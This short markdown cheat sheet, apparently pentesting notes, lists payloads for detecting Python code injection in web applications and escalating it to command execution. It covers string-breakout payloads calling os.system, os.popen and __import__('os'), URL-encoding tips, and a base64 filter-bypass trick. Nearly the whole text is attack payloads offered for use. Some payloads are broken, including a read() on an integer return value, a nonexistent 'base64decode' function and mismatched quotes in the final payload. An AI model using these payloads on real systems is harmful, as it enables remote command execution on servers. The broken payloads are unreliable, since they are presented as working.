# **PYTHON app essential stuff:**

- In python first you need to make sure it's a python application, so we can use this payload:
  - Payload: **"+str(True)+"test** (Make sure you url encode the + to succefully inject it)
  - If the application returns Truetest means that both **str()** and **True** are available giving us a pretty good chance that python is used.
  - Now we will insert our payload inside the **str()**
  - **os.system('id')** :our payload which in return will produce a 0 as our response, this shows that the command got executed successfully.
  - If you try an invalid command you will get a 32512 as your response meaning that the process returned 127 (since the command is not found)
  - If you want to get the value returned by the command one usually uses this payload:
    - Payload: **os.popen('id').read()**
    - Full payload: **"+str(os.popen('id').read())+"** (Always remember to URL encode the + sign which is %2b)
  - If you find the os function not imported one can use the below payload then your command
    - Payload: **__import__('os').system('cmd')**
    - Full payload: **"+str(__import__('os').system('id').read())+"**
    - Payload that returns value of command : **"+str(__import__('os').popen('id').read())+"**
  - In python if the path is blocked one can bypass that by base64 encoding the payload where you will also be required to import the base64decode function to tell the server to decode it using it.
    - The base64decode payload: **__import__('base64').base64decode('payload')** (the payload will be base64 encoded remember that)
    - Full payload: **"+str(__import__('os').popen('__import__('base64').b64decode('payload')').read())+"** (Make sure the payload is base64 encoded and the + sign are url encoded)

- [Python Script Paylods](Attacks/Scripts/PYTHON)
